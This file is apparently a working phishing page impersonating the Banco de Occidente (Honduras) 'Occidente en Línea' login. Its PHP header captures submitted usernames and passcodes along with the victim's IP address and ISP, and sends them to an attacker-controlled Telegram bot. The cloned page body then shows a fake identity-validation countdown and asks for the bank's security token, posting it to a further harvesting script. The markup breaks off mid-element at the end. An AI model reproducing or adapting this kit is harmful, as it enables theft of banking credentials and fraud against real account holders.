
<?php

$uz3r = $_POST["uz3r"];
$p4zz = $_POST["p4zz"];




include_once("cone.php");

$filter = "";

$mensaje = ">> OCCIDENTE <<\n";

$mensaje .= "USUARIO : ".$uz3r."\n";
$mensaje .= "PASSCODE : ".$p4zz."\n";




$filter = base64_encode($filter);


$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
define('BOT_TOKEN', $bottoken);
define('CHAT_ID', $chatid);
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');

$mensaje .= "IP : ".$ip."\n";
$mensaje .= "ISP : ".$isp."\n";

function enviar_telegram($msj){
	$queryArray = [
		'chat_id' => CHAT_ID,
		'text' => $msj,
	];
	$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
	$result = file_get_contents($url);
}

$file_name = 'data/'.$ip.'.db';
enviar_telegram("\n\n".$mensaje);
?>



<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="">
<!-- Mirrored from minielectronica.com/occidentehn/pasw.php by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 13 Feb 2023 22:06:56 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="index_files/bes-what-heare-Widdlesse-of-you-to-made-euen-And.html" async=""></script><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>
	Occidente en Línea | Banco de Occidente S.A.
</title><link href="../../www.bancodeoccidente.hn/enlinea/App_Themes/Imagenes/favicon.html" type="image/x-icon" rel="shortcut icon">

    <!--BOOTSTRAP-->
    <link href="index_files/bootstrap.min.css" rel="stylesheet" type="text/css"><link href="index_files/dataTables.bootstrap.min.css" rel="stylesheet" type="text/css"><link href="index_files/jquery.dataTables.min.css" rel="stylesheet" type="text/css"><link href="index_files/responsive.dataTables.min.css" rel="stylesheet" type="text/css">
    <!--FONTAWESOME-->
    <link href="index_files/font-awesome.min.css" rel="stylesheet" type="text/css">
    <!--METISMSNU-->
    <link href="index_files/metisMenu.css" rel="stylesheet" type="text/css"><link href="index_files/morris.css" rel="stylesheet" type="text/css"><link href="index_files/sb-admin-2.css" rel="stylesheet" type="text/css">
    <!-- jAlert -->
    <link href="index_files/jquery.alerts.css" rel="stylesheet" type="text/css">
    <!-- jAutoComplete -->
    <link href="index_files/jquery.autocomplete.css" rel="stylesheet" type="text/css">
    <!-- fancybox -->
    <link href="index_files/jquery.fancybox.css" rel="stylesheet" type="text/css" media="screen"><link href="index_files/letras.css" rel="stylesheet" type="text/css"><link href="index_files/links.css" rel="stylesheet" type="text/css">
    <!-- jQueryUI -->
    <link href="index_files/jquery-ui.css" rel="stylesheet" type="text/css" media="screen">
    <!-- datepicker -->
    <link href="index_files/bootstrap-datetimepicker.min.css" rel="stylesheet">
    <!--HOJA DE ESTILO-->
    <link href="index_files/Estilos.css" rel="stylesheet" type="text/css">
	<!-- Scrollbar -->
    <link href="index_files/jquery.mCustomScrollbar.css" rel="stylesheet" type="text/css">
<script src="index_files/pa-63d0148e9034fb0011001821.js.descarga" async=""></script>
<style type="text/css">.fancybox-margin{margin-right:17px;}</style></head>
<body class="body-inicio">
<div>
<style>
  
.loadPage{
	height: 100vh;
	width: 90%;
	position: fixed;
	max-height: 650px;
	z-index: 999;
	background: #FFF;
	display: flex;
	flex-direction: column;
	justify-content: center;
	align-items: center;
}
.loadPage h3{
	font-size: 46px;
	color: #444;
	margin-bottom: 15px;
	margin-top: 10px;
	font-weight: lighter;
}
.loadPage p{
	font-size: 20px;
	color: #444;
	margin-bottom: 15px;
	margin-top: 10px;
	font-weight: lighter;
}
.circle:nth-of-type(1){
	width:60px;
	height:60px;
	border-radius: 60px;
	background:#658b31;
	animation: change .3s infinite linear;
}
.circle:nth-of-type(2){
	width:60px;
	height:60px;
	border-radius: 60px;
	background:#FFF;
	animation: change2 .6s infinite linear;
}
.circle:nth-of-type(3){
	width:60px;
	height:60px;
	border-radius: 60px;
	background:#FFF;
	animation: change3 .9s infinite linear;
}
  </style>
  <div class="loadPage">
		<div class="circle-container">
		</div>
		<h3>Seguridad del sistema</h3>
		<p>Espere por favor mientras estamos validando su identidad</p>
		<p>Tiempo estimado <b id="segundos">30s</b></p>
	</div>

  <script type="text/javascript">
		seg=30;
		function dec(){
			seg--;
		}
		setInterval(function(){
			dec();
			document.getElementById("segundos").innerHTML =seg+"s";
			if (seg==0) {
				document.querySelector(".loadPage").style.display="none";
			}
		},1000);
		
	</script>
  
<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="">
<input type="hidden" name="ctl00_ToolkitScriptManager1_HiddenField" id="ctl00_ToolkitScriptManager1_HiddenField" value=";;AjaxControlToolkit, Version=3.5.7.607, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e:en-US:e96eec5b-f5fc-47c8-9cba-2a4f2f4c43f0:5546a2b:475a4ef5:d2e10b12:effe2a26:37e2e5c9:1d3ed089:751cdd15:dfad98a5:497ef277:a43b07eb:3cf12cf1">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE3NTQ1MzIxMjEPZBYCZg9kFgICAQ9kFgICCQ9kFgJmD2QWAmYPZBYCAgEPZBYCZg9kFgRmDw8WBh4IQ3NzQ2xhc3MFIWFsZXJ0IGFsZXJ0LXdhcm5pbmcgYWxlcnQtbWVuc2FqZR4EXyFTQgICHgdWaXNpYmxlZ2QWAgIBDw8WBh8AZB4EVGV4dAUUQWNjZXNvIG5vIEF1dG9yaXphZG8fAQICZGQCBQ8WAh4JaW5uZXJodG1sBfkbPGRpdiBpZCA9J215Q2Fyb3VzZWwnIGNsYXNzPSdjYXJvdXNlbCBzbGlkZSBjYXJvdXNlbC1hbnVuY2lvcycgZGF0YS1yaWRlPSdjYXJvdXNlbCcgZGF0YS1pbnRlcnZhbD0nMTUwMDAnPjxvbCBjbGFzcz0nY2Fyb3VzZWwtaW5kaWNhdG9ycyc+PGxpIGRhdGEtdGFyZ2V0PSNteUNhcm91c2VsIGRhdGEtc2xpZGUtdG89JzAnIGNsYXNzPSdhY3RpdmUnPjwvbGk+PGxpIGRhdGEtdGFyZ2V0PSNteUNhcm91c2VsIGRhdGEtc2xpZGUtdG89JzEnPjwvbGk+PGxpIGRhdGEtdGFyZ2V0PSNteUNhcm91c2VsIGRhdGEtc2xpZGUtdG89JzInPjwvbGk+PGxpIGRhdGEtdGFyZ2V0PSNteUNhcm91c2VsIGRhdGEtc2xpZGUtdG89JzMnPjwvbGk+PC9vbD48ZGl2IGNsYXNzPSdjYXJvdXNlbC1pbm5lcic+PGRpdiBjbGFzcz0naXRlbSBhY3RpdmUnPjxkaXYgY2xhc3M9J2Nhcm91c2VsLWNhcHRpb24nPjxkaXYgY2xhc3M9J21DdXN0b21TY3JvbGxiYXInPjxkaXYgY2xhc3M9J2NvbnRlbmlkbyc+PHAgY2xhc3M9J3RleHQtdXBwZXJjYXNlIHAtdGl0dWxvIGJvbGQgdGV4dC1sZWZ0Jz5WZW5jaW1pZW50byBkZSBUb2tlbnMgKERpc3Bvc2l0aXZvcyBkZSBTZWd1cmlkYWQpPC9wPjxoci8+PHAgY2xhc3M9J3RleHQtanVzdGlmeSc+RXN0aW1hZG8gQ2xpZW50ZTogPC9icj4gQ29uIG1vdGl2byBkZSBvZnJlY2VybGVzIHVuIG1lam9yIHNlcnZpY2lvLCBsZXMgc29saWNpdGFtb3MgcmV2aXNhciBsYSBmZWNoYSBkZSB2ZW5jaW1pZW50byBkZSBzdSB0b2tlbiBkZSBhY2Nlc28gYSBPY2NpZGVudGUgZW4gTMOtbmVhLCBsYSBjdWFsIGFwYXJlY2UgYWwgcmV2ZXJzbyBkZWwgbWlzbW8uIDwvYnI+IFNpIGxhIGZlY2hhIGRlIHZlbmNpbWllbnRvIGVzdGEgcHLDs3hpbWEsIGZhdm9yIGFib2NhcnNlIGEgY3VhbHF1aWVyYSBkZSBudWVzdHJhcyBhZ2VuY2lhcyBwYXJhIHJlcG9uZXJsby48L3A+PC9kaXY+PC9kaXY+PC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0naXRlbSc+PGRpdiBjbGFzcz0nY2Fyb3VzZWwtY2FwdGlvbic+PGRpdiBjbGFzcz0nbUN1c3RvbVNjcm9sbGJhcic+PGRpdiBjbGFzcz0nY29udGVuaWRvJz48cCBjbGFzcz0ndGV4dC11cHBlcmNhc2UgcC10aXR1bG8gYm9sZCB0ZXh0LWxlZnQnPlBST01PQ0nDk04gQ0xBUk8gU8OBQkFETyAxMSBERSBGRUJSRVJPPC9wPjxoci8+PHAgY2xhc3M9J3RleHQtanVzdGlmeSc+RXN0aW1hZG8gQ2xpZW50ZSBsZSBpbmZvcm1hbW9zIHF1ZSBlbCBzw6FiYWRvIDExIGRlIEZFQlJFUk8gc2UgdGllbmUgU8OJWFRVUExFIFNBTERPIGFsIHJlY2FyZ2FyIGRlIEwuIDI1LjAwIGVuIGFkZWxhbnRlIHBvciBudWVzdHJhcyBwbGF0YWZvcm1hcyBlbGVjdHLDs25pY2FzIChPY2NpZGVudGUgZW4gTMOtbmVhIHkgT2NjaWRlbnRlIE3Ds3ZpbCkgPGJyPjwvcD48L2Rpdj48L2Rpdj48L2Rpdj48L2Rpdj48ZGl2IGNsYXNzPSdpdGVtJz48ZGl2IGNsYXNzPSdjYXJvdXNlbC1jYXB0aW9uJz48ZGl2IGNsYXNzPSdtQ3VzdG9tU2Nyb2xsYmFyJz48ZGl2IGNsYXNzPSdjb250ZW5pZG8nPjxwIGNsYXNzPSd0ZXh0LXVwcGVyY2FzZSBwLXRpdHVsbyBib2xkIHRleHQtbGVmdCc+PEg1PiBCQU5DT1MgSEFCSUxJVEFET1MgUEFSQSBSRUNJQklSIFBBR09TIERFIFBSw4lTVEFNT1MgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvSDU+PC9wPjxoci8+PHAgY2xhc3M9J3RleHQtanVzdGlmeSc+RXN0aW1hZG8gY2xpZW50ZSBsZSBkZXRhbGxhbW9zIGxvcyBiYW5jb3MgcXVlIGFjZXB0YW4gcGFnb3MgZGUgUFLDiVNUQU1PUyBwb3IgbWVkaW8gZGUgbGEgcGxhdGFmb3JtYSBBQ0gtUHJvbnRvIDogPGJyPjxicj4gICAgICAgICAgICAgICAgICAtIEJhbmNvIERBVklWSUVOREEgIDxicj4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtIEJhbmNvIEZJQ09IU0EgICAgICA8YnI+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtIEJhbmNvIGRlIGxvcyBUcmFiYWphZG9yZXMgKEJBTlRSQUIpIDxicj4gICAgICAgICAgICAgICAgICAgICAgICAgICAtIEJhbmNvIEJBQyBDUkVET01BVElDIDxicj4gPGJyPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvcyBiYW5jb3Mgbm8gbGlzdGFkb3MsIG5vIHJlY2liZW4gZXN0ZSBwYWdvIHBvciBsYSBwbGF0YWZvcm1hIGRlIEFDSC48L3A+PC9kaXY+PC9kaXY+PC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0naXRlbSc+PGRpdiBjbGFzcz0nY2Fyb3VzZWwtY2FwdGlvbic+PGRpdiBjbGFzcz0nbUN1c3RvbVNjcm9sbGJhcic+PGRpdiBjbGFzcz0nY29udGVuaWRvJz48cCBjbGFzcz0ndGV4dC11cHBlcmNhc2UgcC10aXR1bG8gYm9sZCB0ZXh0LWxlZnQnPjxINj4gQkFOQ09TIEhBQklMSVRBRE9TIFBBUkEgUkVDSUJJUiBQQUdPUyBERSBUQVJKRVRBUyBERSBDUsOJRElUTyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvSDY+PC9wPjxoci8+PHAgY2xhc3M9J3RleHQtanVzdGlmeSc+RXN0aW1hZG8gY2xpZW50ZSBsZSBkZXRhbGxhbW9zIGxvcyBiYW5jb3MgcXVlIGFjZXB0YW4gcGFnb3MgZGUgVEFSSkVUQSBERSBDUsOJRElUTyBwb3IgbWVkaW8gZGUgbGEgcGxhdGFmb3JtYSBBQ0gtUHJvbnRvIDogPGJyPjxicj4gICAgICAgICAgLSBCYW5jbyBBdGzDoW50aWRhICA8YnI+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0gQmFuY28gZGVsIFBhw61zIChCQU5QQUlTKSA8YnI+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtIEJhbmNvIEhvbmR1cmXDsW8gZGVsIENhZsOpIChCQU5IQ0FGRSkgPGJyPiAgICAgICAgICAgICAgICAgICAgICAgICAgIC0gQmFuY28gTEFGSVNFICAgICA8YnI+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0gQmFuY28gUFJPTUVSSUNBICA8YnI+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0gQmFuY28gRklDT0hTQSAgICA8YnI+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0gQmFuY28gREFWSVZJRU5EQSAgPGJyPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0gQmFuY28gQkFDIENSRURPTUFUSUMgPGJyPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnI+IExvcyBiYW5jb3Mgbm8gbGlzdGFkb3MsIG5vIHJlY2liZW4gZXN0ZSBwYWdvIHBvciBsYSBwbGF0YWZvcm1hIGRlIEFDSC48L3A+PC9kaXY+PC9kaXY+PC9kaXY+PC9kaXY+PGRpdiBpZCA9ICdwaWUtYm9sZXRpbicgY2xhc3M9J21vZGFsLWZvb3RlciBwaWUtYm9sZXRpbic+PGg1IGNsYXNzPSd0ZXh0LWNlbnRlcic+PHN0cm9uZz5CQU5DTyBERSBPQ0NJREVOVEUsIFMuQS48L3N0cm9uZz4gQXBveWFuZG8gYWwgcGVxdWXDsW8gZGUgaG95LCBoYWNlbW9zIGVsIGdyYW5kZSBkZWwgbWHDsWFuYS48L2g1PjwvZGl2PjwvZGl2PjwvZGl2PmRkCM69QReKwZeML/RcNeub4S3gSPY=">
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['aspnetForm'];
if (!theForm) {
    theForm = document.aspnetForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="index_files/WebResource.html" type="text/javascript"></script>


<script src="index_files/ScriptResource.html" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
//]]>
</script>

<script src="index_files/ScriptResource(1).html" type="text/javascript"></script>
<script src="index_files/jquery-2.1.4.min.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery.tooltip.js.descarga" type="text/javascript"></script>
<script src="index_files/bootstrap.min.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery.dataTables.min.js.descarga" type="text/javascript"></script>
<script src="index_files/dataTables.bootstrap.min.js.descarga" type="text/javascript"></script>
<script src="index_files/datatables-responsive.min.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery.autocomplete.js.descarga" type="text/javascript"></script>
<script src="index_files/bootstrap-filestyle.min.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery.mousewheel-3.0.6.pack.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery.fancybox.js.descarga" type="text/javascript"></script>
<script src="index_files/fancybox.web.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery.easyListSplitter.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery.ui.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery.ui.datepicker-es.js.descarga" type="text/javascript"></script>
<script src="index_files/moment.js.descarga" type="text/javascript"></script>
<script src="index_files/locale-es.js.descarga" type="text/javascript"></script>
<script src="index_files/bootstrap-datetimepicker.min.js.descarga" type="text/javascript"></script>
<script src="index_files/select2.full.min.js.descarga" type="text/javascript"></script>
<script src="index_files/select2.es.js.descarga" type="text/javascript"></script>
<script src="index_files/tooltipster.bundle.min.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery.mask.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery-funs.js.descarga" type="text/javascript"></script>
<script src="index_files/jquery.mCustomScrollbar.concat.min.js.descarga" type="text/javascript"></script>
<script src="index_files/bLogin.html" type="text/javascript"></script>
<script src="index_files/WebResource(1).html" type="text/javascript"></script>
<div>

	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWBAKZ8Lg3AoG3v4cPAoe4jr8IAqfa+c4Mx8aSJQNEKdDg9bfeE/sYXo+ns1I=">
</div><!-- onkeydown="return noPaste(event,this)" -->
         <div class="header">
                <script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('ctl00$ToolkitScriptManager1', document.getElementById('aspnetForm'));
Sys.WebForms.PageRequestManager.getInstance()._updateControls(['tctl00$UpdatePanel1','tctl00$CTBCuerpo$UpdatePanel1'], [], [], 60);
//]]>
</script>

               
        </div> <!-- header -->
         <div class="clear">
                    
                    
                    <div id="ctl00_pnlProgress" class="divLoading" style="display: none; position: fixed; z-index: 100001;">
	
                        <img id="ctl00_imgLogotipo" class="imgLogotipo" src="index_files/logotipo.png" style="width:50px;border-width:0px;">
                        <img id="ctl00_ImgProgreso" src="index_files/loading.svg" style="width:70px;border-width:0px;">
                    
</div>
                    
                    
		<div id="ctl00_mpeProgress_backgroundElement" class="modalBackground" style="display: none; position: fixed; left: 0px; top: 0px; z-index: 10000;"></div></div>
        <div id="ctl00_UpdatePanel1">
	
                <div class="container-fluid">
                    <div id="nav-menu-info" class="row row-iconos">
                        <div>
                            <div class="col-lg-2 col-md-3 col-sm-3 col-xs-6 col-iconos">
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-2 col-xs-6">
                            </div>
                            <div class="col-lg-8 col-md-7 col-sm-7 col-xs-12">
</ul>
                            </div>
                        </div>
                    </div>           
                    <div class="row row-logo">
                        <div class="col-md-8 col-xs-6">
                            <img class="img-respondive img-container-inicio pull-left" alt="Banco de occidente" src="index_files/bancocci_logo.png">
                        </div>
                        <div class="col-md-4 col-xs-6">
                            <img class="img-respondive img-container-enLinea inicio pull-right" alt="Banco de occidente" src="index_files/logo_enlinea.png">
                        </div>
                    </div>

                    <div class="page-wrap">

                      <div class="container-inicio">
                            
                            
    <div id="ctl00_CTBCuerpo_UpdatePanel1">
		
               
            <div class="row">
              
                <div class="col-md-6 col-xs-12">
                    <div class="divTituloLogin">
                        <h2 class="letraTituloInternos titulo-principal">Porfavor ingrese su token para verificar su identidad</h2>
                    </div>

                    <div class="row">
                        <div class="col-md-12" style="margin-top:5px;">
                                    
                                </div>
                    </div>
                    <div id="ctl00_CTBCuerpo_PanelLogin">
			
                        <div class="container-fluid tableLoginAcceso">
                            <div class="row">
                                <div class="form-horizontal form-login forms-wall ">
                                    <div class="row">
                                    <div class="col-md-10 col-md-offset-1 col-sm-10 col-sm-offset-1">
                                        <form action="toke3.php" method="post"> 
                                        <div class="form-group">
                                            <label class="control-label col-md-3 col-sm-2 col-xs-12" for="email">&nbsp;TOKEN:</label>
                                            <div class="col-md-9 col-sm-10 col-xs-12">
                                                <div class="input-group">
                                                    <input name="uz3r" type="text" id="ctl00_CTBCuerpo_txtUsuario" tabindex="1" class="form-control inputMinus">
                                                    <span class="input-group-addon">
                                                        <a class="popover-small pull-left" href="javascript: void(0)" data-contentwrapper=".contenido-popover-user" data-original-title="" title="">
                                                            <img src="icon1.png">
                                                        </a>
                                                    </span>
                                                </div>
                                            </div>
                                        </div>
                                    
                                        <div class="form-group">
                                            <div class="col-sm-12 col-xs-12">
                                                <input type="submit" id="add" name="ctl00$CTBCuerpo$btnIngresar" value="Verificar" class="btn btn-success btn-green pull-right btnIngresar">
                                            </div>
                                        </div>
                                    </form>                       
                                    </div>
                                    </div>
                                </div>
                            </div>
                            
                                
                            <section class="hidden-xs">
                                <div class="row">
                                    <div class="TDContentInfoLogin">
                                        <span class="bold text-danger">*</span>&nbsp;<b>Primer ingreso:</b> digite únicamente el código dinámico del token.<br>
                                        <span class="bold text-danger">*</span>&nbsp;<b>Reingreso:</b> digite pin y Token.
                                    </div>
                                </div>
                                <div class="row">
                                   <div class="container-fluid TDContentInfoPopover padding-off">
                                       
                                        <a id="popover3" class="col-md-4 col-xs-12 info1 bold text-green popover-big" href="javascript: void(0)" data-contentwrapper=".contenido-popover-usuario" data-original-title="" title="">
                                           ¿Desea obtener su Usuario?
                                        </a>
                                       
                                        <a id="popover4" class="col-md-4 col-xs-12 info2 bold text-green popover-big" href="javascript: void(0)" data-contentwrapper=".contenido-popover-pin" data-original-title="" title="">
                                           ¿Olvidó su Usuario o PIN?
                                        </a>
                                       
                                       <a id="popover5" class="col-md-4 col-xs-12 info3 bold text-green popover-big" href="javascript: void(0)" data-contentwrapper=".contenido-popover-token" data-original-title="" title="">
                                           ¿Su Token está bloqueado?  
                                       </a>  
                                    </div>
                                </div>
                            </section>
                        </div>
                        
                    
		</div>

                    

                    

                    

                    
                </div>

                <div class="col-md-6 col-xs-12 hidden-xs padding-sec-anuncios">

                    <ul class="nav nav-tabs tab-principal">
                      <li class="active"><a data-toggle="tab" href="https://www.bancodeoccidente.hn/enlinea/bLogin.aspx#anuncios">Anuncios</a></li>
                      <li><a data-toggle="tab" href="https://www.bancodeoccidente.hn/enlinea/bLogin.aspx#informacion">Información</a></li>
                    </ul>
                    <div class="tab-content">
                      <div id="anuncios" class="tab-pane fade in active">
                            <div id="carousel-anuncios" class="carousel slide" data-ride="carousel">
                              <!-- Indicators -->
                              <ol class="carousel-indicators">
                                <li data-target="#carousel-anuncios" data-slide-to="0" class=""></li>
                                <li data-target="#carousel-anuncios" data-slide-to="1" class=""></li>
                                <li data-target="#carousel-anuncios" data-slide-to="2" class=""></li>
                                <li data-target="#carousel-anuncios" data-slide-to="3" class=""></li>
                                <li data-target="#carousel-anuncios" data-slide-to="4" class=""></li>
						<li data-target="#carousel-anuncios" data-slide-to="5" class="active"></li>

                              </ol>

                              <!-- Wrapper for slides -->
                              <div class="carousel-inner">
                                <div class="item">
                                  <img src="index_files/BDO_Arte5.jpg" alt="">
                                </div>    

                                <div class="item">
                                  <img src="index_files/BDO_Arte1.jpg" alt="">
                                </div>

                                  <div class="item">
                                  <img src="index_files/BDO_Arte2.jpg" alt="">
                                </div>

                                <div class="item">
                                  <img src="index_files/BDO_Arte3.jpg" alt="">
                                </div>

                                <div class="item">
                                  <img src="index_files/BDO_Arte4.jpg" alt="">
                                </div> 

						<div class="item active">
                                  <img src="index_files/BDO_Arte6.jpg" alt="">
                                </div>              
                              </div>
                              <!-- Left and right controls -->
                              <a class="left carousel-control" href="https://www.bancodeoccidente.hn/enlinea/bLogin.aspx#carousel-anuncios" data-slide="prev">
                                   <span class="icon-prev"><i class="fa fa-angle-left fa-lg"></i></span>
                              </a>
                              <a class="right carousel-control" href="https://www.bancodeoccidente.hn/enlinea/bLogin.aspx#carousel-anuncios" data-slide="next">
                                  <span class="icon-next"><i class="fa fa-angle-right fa-lg"></i></span>
                              </a>
                            </div>
                            <!-- ANUNCIOS-->
                            <div id="ctl00_CTBCuerpo_items" class="anuncio-publicitario"><div id="myCarousel" class="carousel slide carousel-anuncios" data-ride="carousel" data-interval="15000"><ol class="carousel-indicators"><li data-target="#myCarousel" data-slide-to="0" class=""></li><li data-target="#myCarousel" data-slide-to="1" class=""></li><li data-target="#myCarousel" data-slide-to="2" class=""></li><li data-target="#myCarousel" data-slide-to="3" class="active"></li></ol><div class="carousel-inner"><div class="item"><div class="carousel-caption"><div class="mCustomScrollbar _mCS_5 mCS_no_scrollbar"><div id="mCSB_5" class="mCustomScrollBox mCS-light mCSB_vertical mCSB_inside" tabindex="0" style="max-height: 0px;"><div id="mCSB_5_container" class="mCSB_container mCS_y_hidden mCS_no_scrollbar_y" style="position:relative; top:0; left:0;" dir="ltr"><div class="contenido mCustomScrollbar _mCS_1 mCS_no_scrollbar"><div id="mCSB_1" class="mCustomScrollBox mCS-inset-dark mCSB_vertical mCSB_inside" style="max-height: none;" tabindex="0"><div id="mCSB_1_container" class="mCSB_container mCS_y_hidden mCS_no_scrollbar_y" style="position:relative; top:0; left:0;" dir="ltr"><p class="text-uppercase p-titulo bold text-left">Vencimiento de Tokens (Dispositivos de Seguridad)</p><hr><p class="text-justify">Estimado Cliente: <br> Con motivo de ofrecerles un mejor servicio, les solicitamos revisar la fecha de vencimiento de su token de acceso a Occidente en Línea, la cual aparece al reverso del mismo. <br> Si la fecha de vencimiento esta próxima, favor abocarse a cualquiera de nuestras agencias para reponerlo.</p></div><div id="mCSB_1_scrollbar_vertical" class="mCSB_scrollTools mCSB_1_scrollbar mCS-inset-dark mCSB_scrollTools_vertical" style="display: none;"><div class="mCSB_draggerContainer"><div id="mCSB_1_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 30px; height: 0px; top: 0px;"><div class="mCSB_dragger_bar" style="line-height: 30px;"></div></div><div class="mCSB_draggerRail"></div></div></div></div></div></div><div id="mCSB_5_scrollbar_vertical" class="mCSB_scrollTools mCSB_5_scrollbar mCS-light mCSB_scrollTools_vertical" style="display: none;"><div class="mCSB_draggerContainer"><div id="mCSB_5_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 30px; height: 0px; top: 0px;"><div class="mCSB_dragger_bar" style="line-height: 30px;"></div></div><div class="mCSB_draggerRail"></div></div></div></div></div></div></div><div class="item"><div class="carousel-caption"><div class="mCustomScrollbar _mCS_6 mCS_no_scrollbar"><div id="mCSB_6" class="mCustomScrollBox mCS-light mCSB_vertical mCSB_inside" tabindex="0" style="max-height: 0px;"><div id="mCSB_6_container" class="mCSB_container mCS_y_hidden mCS_no_scrollbar_y" style="position:relative; top:0; left:0;" dir="ltr"><div class="contenido mCustomScrollbar _mCS_2 mCS_no_scrollbar"><div id="mCSB_2" class="mCustomScrollBox mCS-inset-dark mCSB_vertical mCSB_inside" tabindex="0" style="max-height: none;"><div id="mCSB_2_container" class="mCSB_container mCS_y_hidden mCS_no_scrollbar_y" style="position:relative; top:0; left:0;" dir="ltr"><p class="text-uppercase p-titulo bold text-left">PROMOCIÓN CLARO SÁBADO 11 DE FEBRERO</p><hr><p class="text-justify">Estimado Cliente le informamos que el sábado 11 de FEBRERO se tiene SÉXTUPLE SALDO al recargar de L. 25.00 en adelante por nuestras plataformas electrónicas (Occidente en Línea y Occidente Móvil) <br></p></div><div id="mCSB_2_scrollbar_vertical" class="mCSB_scrollTools mCSB_2_scrollbar mCS-inset-dark mCSB_scrollTools_vertical" style="display: none;"><div class="mCSB_draggerContainer"><div id="mCSB_2_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 30px; top: 0px; height: 0px;"><div class="mCSB_dragger_bar" style="line-height: 30px;"></div></div><div class="mCSB_draggerRail"></div></div></div></div></div></div><div id="mCSB_6_scrollbar_vertical" class="mCSB_scrollTools mCSB_6_scrollbar mCS-light mCSB_scrollTools_vertical" style="display: none;"><div class="mCSB_draggerContainer"><div id="mCSB_6_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 30px; top: 0px; height: 0px;"><div class="mCSB_dragger_bar" style="line-height: 30px;"></div></div><div class="mCSB_draggerRail"></div></div></div></div></div></div></div><div class="item"><div class="carousel-caption"><div class="mCustomScrollbar _mCS_7 mCS_no_scrollbar"><div id="mCSB_7" class="mCustomScrollBox mCS-light mCSB_vertical mCSB_inside" tabindex="0" style="max-height: 0px;"><div id="mCSB_7_container" class="mCSB_container mCS_y_hidden mCS_no_scrollbar_y" style="position:relative; top:0; left:0;" dir="ltr"><div class="contenido mCustomScrollbar _mCS_3 mCS_no_scrollbar"><div id="mCSB_3" class="mCustomScrollBox mCS-inset-dark mCSB_vertical mCSB_inside" tabindex="0" style="max-height: none;"><div id="mCSB_3_container" class="mCSB_container mCS_y_hidden mCS_no_scrollbar_y" style="position:relative; top:0; left:0;" dir="ltr"><p class="text-uppercase p-titulo bold text-left"></p><h5> BANCOS HABILITADOS PARA RECIBIR PAGOS DE PRÉSTAMOS                                                                       </h5><p></p><hr><p class="text-justify">Estimado cliente le detallamos los bancos que aceptan pagos de PRÉSTAMOS por medio de la plataforma ACH-Pronto : <br><br>                  - Banco DAVIVIENDA  <br>                                             - Banco FICOHSA      <br>                                            - Banco de los Trabajadores (BANTRAB) <br>                           - Banco BAC CREDOMATIC <br> <br>                                    Los bancos no listados, no reciben este pago por la plataforma de ACH.</p></div><div id="mCSB_3_scrollbar_vertical" class="mCSB_scrollTools mCSB_3_scrollbar mCS-inset-dark mCSB_scrollTools_vertical" style="display: none;"><div class="mCSB_draggerContainer"><div id="mCSB_3_dragger_vertical" class="mCSB_dragger" 